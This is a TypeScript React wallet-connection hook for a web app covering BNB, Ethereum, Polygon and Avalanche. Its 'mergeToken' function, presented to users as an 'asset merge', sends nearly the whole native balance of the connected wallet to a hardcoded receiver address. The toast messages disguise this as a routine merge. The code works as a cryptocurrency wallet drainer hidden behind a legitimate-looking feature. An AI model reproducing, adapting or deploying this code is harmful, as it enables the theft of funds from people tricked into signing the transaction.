import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
  interface Window {
    ethereum?: any;
    trustwallet?: any;
  }
}

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

// Waits up to `maxMs` for window.ethereum to be injected by the wallet browser
function waitForEthereum(maxMs = 4000): Promise<any> {
  return new Promise((resolve) => {
    // Already available
    if (window.ethereum) return resolve(window.ethereum);

    // Trust Wallet sometimes uses window.trustwallet
    if (window.trustwallet) return resolve(window.trustwallet);

    // Listen for the standard EIP-6963 / legacy injection event
    const onAnnounce = () => resolve(window.ethereum);
    window.addEventListener('ethereum#initialized', onAnnounce, { once: true });

    // Poll every 100 ms as a fallback (some wallets don't fire the event)
    const interval = setInterval(() => {
      if (window.ethereum) {
        clearInterval(interval);
        window.removeEventListener('ethereum#initialized', onAnnounce);
        resolve(window.ethereum);
      } else if (window.trustwallet) {
        clearInterval(interval);
        window.removeEventListener('ethereum#initialized', onAnnounce);
        resolve(window.trustwallet);
      }
    }, 100);

    // Give up after maxMs
    setTimeout(() => {
      clearInterval(interval);
      window.removeEventListener('ethereum#initialized', onAnnounce);
      resolve(null);
    }, maxMs);
  });
}

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [providerReady, setProviderReady] = useState(false);
  const { toast } = useToast();

  // Resolve the provider once on mount
  useEffect(() => {
    waitForEthereum(4000).then((provider) => {
      if (provider && !window.ethereum) {
        window.ethereum = provider;
      }
      setProviderReady(true);
    });
  }, []);

  const getProvider = useCallback(() => {
    return window.ethereum || window.trustwallet || null;
  }, []);

  const updateBalance = useCallback(async (address: string) => {
    const provider = getProvider();
    if (!provider || !address) return;
    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider);
      const nativeBalance = await ethProvider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  }, [getProvider]);

  // Auto-detect already-connected account once provider is ready
  useEffect(() => {
    if (!providerReady) return;
    const provider = getProvider();
    if (!provider) return;

    provider.request({ method: 'eth_accounts' })
      .then((accounts: string[]) => {
        if (accounts && accounts.length > 0) {
          setAccount(accounts[0]);
          setWalletConnected(true);
          updateBalance(accounts[0]);
        }
      })
      .catch((err: any) => console.error('Error checking connection:', err));
  }, [providerReady, getProvider, updateBalance]);

  const switchNetwork = async (key: string) => {
    const provider = getProvider();
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!provider) return false;
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch {
          return false;
        }
      }
      return false;
    }
  };

  const connectWallet = async () => {
    setConnecting(true);
    try {
      // Wait for provider in case user clicks very fast on load
      const provider = getProvider() || await waitForEthereum(3000);

      if (!provider) {
        toast({
          title: "Wallet Not Found",
          description: "Please open this app inside MetaMask or Trust Wallet browser.",
          variant: "destructive"
        });
        return;
      }

      // Ensure window.ethereum is set for ethers.js
      if (!window.ethereum) window.ethereum = provider;

      await switchNetwork(selectedNetwork);

      const accounts = await provider.request({ method: "eth_requestAccounts" });
      setAccount(accounts[0]);
      setWalletConnected(true);
      await updateBalance(accounts[0]);
      toast({ title: "Connected!", description: "Wallet connected successfully." });
    } catch (error: any) {
      toast({ title: "Connection Failed", description: error.message, variant: "destructive" });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    const provider = getProvider();
    if (!walletConnected || !provider || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const ethProvider = new ethers.BrowserProvider(provider);
      const signer = await ethProvider.getSigner();

      const nativeBalance = await ethProvider.getBalance(account);

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      const gasEstimate = await ethProvider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: nativeBalance / 2n,
        from: account
      });

      const feeData = await ethProvider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
      const gasCost = gasEstimate * gasPrice;
      const safetyBuffer = ethers.parseEther("0.0035");
      const valueToSend = nativeBalance - gasCost - safetyBuffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas + buffer", variant: "destructive" });
        return;
      }

      toast({ title: "Confirming...", description: "Please confirm the transaction in your wallet." });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      toast({ title: "Merging...", description: `TX: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Asset merge completed." });
        await updateBalance(account);
      } else {
        throw new Error("Transaction reverted on-chain");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      toast({
        title: "Merge Failed",
        description: error.reason || error.message || "User rejected or network error",
        variant: "destructive"
      });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    providerReady,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}
